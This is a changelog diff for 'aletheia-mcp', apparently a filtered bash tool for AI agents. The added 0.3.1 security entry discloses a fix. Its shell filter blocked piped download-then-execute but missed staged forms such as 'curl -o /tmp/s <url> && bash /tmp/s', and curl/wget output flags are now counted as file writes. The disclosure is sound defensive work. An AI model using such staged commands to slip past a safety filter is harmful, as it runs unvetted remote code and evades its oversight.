@@ -4,6 +4,23 @@ All notable changes to `aletheia-mcp` are documented here. This project follows
 [Semantic Versioning](https://semver.org/) and the
 [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) format.
 
+## [0.3.1] - 2026-09-12
+
+### Security
+- **Download-then-execute bypass in `aletheia_safe_bash`'s obfuscation filter.**
+  The blacklist only matched a payload piped directly into a shell
+  (`curl ... | sh`). A command that staged a payload to disk in one step and
+  executed it separately (e.g. `curl -o /tmp/s <url> && bash /tmp/s`) was not
+  detected, once an operator had already enabled network access via
+  `--allow-network`. Not exploitable on a default install, which denies network
+  egress unless explicitly allowed. `bash-analyzer.ts` now detects
+  interpreter-based and direct/`chmod`-based download-then-exec chains
+  regardless of whether they're piped.
+- `curl -o/-O/--output/--remote-name` and `wget -O/--output-document` are now
+  recognized as filesystem writes, so a session with network access granted but
+  write access denied can no longer silently stage files to disk.
+- Reported by Artyom Lobanov ([@Morendais](https://github.com/Morendais)).
+
 ## [0.3.0] - 2026-09-06
 
 ### Added
